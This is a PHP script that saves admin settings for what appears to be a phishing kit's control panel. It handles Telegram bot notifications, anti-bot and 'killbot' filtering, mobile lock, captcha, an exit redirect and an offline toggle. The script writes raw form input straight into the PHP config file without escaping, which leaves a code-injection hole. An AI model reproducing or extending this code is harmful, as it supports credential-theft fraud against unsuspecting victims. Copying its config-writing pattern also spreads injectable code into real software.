<?php
include 'inc/config.php';
include 'inc/connect.php';
date_default_timezone_set('Europe/Dublin');
session_start();

// Redirect if not logged in
if (!isset($_SESSION['loggedin'])) {
    die();
}

// Check access permissions
if ($handlers_access != "checked" && $_SESSION['role'] != "Admin") {
    die();
}

// Handle updating settings
$str = file_get_contents('inc/config.php');

$dbhost = $_POST['dbhost'];
$dbname = $_POST['dbname'];
$dbuser = $_POST['dbuser'];
$dbpass = $_POST['dbpass'];
$adminuser = $_POST['adminuser'];
$adminpass = $_POST['adminpass'];
$extlink = $_POST['extlink'];
$chatid = $_POST['chatid'];
$bottoken = $_POST['bottoken'];

$phonenum = $_POST['phonenum'];
$address = $_POST['address'];
$onetime = $_POST['onetime'];
$moblock = $_POST['moblock'];
$gateway = $_POST['gateway'];
$antibots = $_POST['antibots'];
$robots = $_POST['robots'];
$killbot = $_POST['killbot'];
$captcha = $_POST['captcha'];
$notify = $_POST['notify'];
$hsettings = $_POST['hsettings'];

if($address == "on"){
    $address = "checked";
}

if($onetime == "on"){
    $onetime = "checked";
}

if($moblock == "on"){
    $moblock = "checked";
}

if($gateway == "on"){
    $gateway = "checked";
}

if($antibots == "on"){
    $antibots = "checked";
}

if($robots == "on"){
    $robots = "checked";
}

if($killbot == "on"){
    $killbot = "checked";
}

if($captcha == "on"){
    $captcha = "checked";
}

if($notify == "on"){
    $notify = "checked";
}

if($hsettings == "on"){
    $hsettings = "checked";
}

$str = str_replace("servername = '$servername'", "servername = '$dbhost'", $str);
$str = str_replace("database = '$database'", "database = '$dbname'", $str);
$str = str_replace("username = '$username'", "username = '$dbuser'", $str);
$str = str_replace("password = '$password'", "password = '$dbpass'", $str);
$str = str_replace("admin_panel_username = '$admin_panel_username'", "admin_panel_username = '$adminuser'", $str);
$str = str_replace("admin_panel_password = '$admin_panel_password'", "admin_panel_password = '$adminpass'", $str);
$str = str_replace("exit_url = '$exit_url'", "exit_url = '$extlink'", $str);
$str = str_replace("telegram_chaid = '$telegram_chaid'", "telegram_chaid = '$chatid'", $str);
$str = str_replace("bot_token = '$bot_token'", "bot_token = '$bottoken'", $str);
$str = str_replace("phone = '$phone'", "phone = '$phonenum'", $str);

$str = str_replace("enable_address = '$enable_address'", "enable_address = '$address'", $str);
$str = str_replace("enable_onetime = '$enable_onetime'", "enable_onetime = '$onetime'", $str);
$str = str_replace("mobile_lock = '$mobile_lock'", "mobile_lock = '$moblock'", $str);
$str = str_replace("enable_gateway = '$enable_gateway'", "enable_gateway = '$gateway'", $str);
$str = str_replace("enable_antibots = '$enable_antibots'", "enable_antibots = '$antibots'", $str);
$str = str_replace("enable_robots = '$enable_robots'", "enable_robots = '$robots'", $str);
$str = str_replace("enable_killbot = '$enable_killbot'", "enable_killbot = '$killbot'", $str);
$str = str_replace("enable_captcha = '$enable_captcha'", "enable_captcha = '$captcha'", $str);
$str = str_replace("enable_telegram = '$enable_telegram'", "enable_telegram = '$notify'", $str);
$str = str_replace("handlers_access = '$handlers_access'", "handlers_access = '$hsettings'", $str);

file_put_contents('inc/config.php', $str);

// Handle checkbox state update
if (isset($_POST['checkbox_state'])) {
    // Checkbox is checked, update state to 1
    $_SESSION['checkbox_state'] = 1;
} else {
    // Checkbox is unchecked, update state to 0
    $_SESSION['checkbox_state'] = 0;
}

// Write checkbox state to file
$file = fopen("offline.txt", "w");
fwrite($file, $_SESSION['checkbox_state']);
fclose($file);

// Redirect back to settings page
header('Location: settings.php');
exit;


?>
